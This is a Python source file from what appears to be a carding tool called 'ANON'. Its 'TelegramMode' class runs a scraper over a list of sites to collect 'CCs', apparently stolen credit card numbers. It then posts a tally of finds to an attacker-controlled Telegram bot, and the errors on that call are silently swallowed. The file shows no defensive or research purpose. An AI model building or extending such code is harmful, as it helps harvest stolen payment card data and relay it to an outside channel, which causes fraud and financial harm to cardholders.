
import requests
from core.scraper import AnonScraper
from config.sites import get_all_sites

class TelegramMode:
    """Auto-send new CCs to Telegram bot"""
    def __init__(self, db):
        self.db = db
        from core.fx import fx
        self.fx = fx
        self.bot_token = "YOUR_BOT_TOKEN"
        self.chat_id = "YOUR_CHAT_ID"

    def _send(self, msg):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            requests.post(url, json={"chat_id": self.chat_id, "text": msg}, timeout=10)
        except:
            pass

    def run(self):
        print(f"\n{self.fx.neon('📱 TELEGRAM MODE — AUTO NOTIFY')}\n")
        print(f"{self.fx.YELLOW}Set bot_token & chat_id in modes/telegram.py{self.fx.RESET}\n")
        sites = get_all_sites()
        scraper = AnonScraper(self.db, self.fx)
        scraper.run_all(sites, workers=3)
        self._send(f"✅ ANON Scan Complete! Found: {self.db.get_total()} CCs")
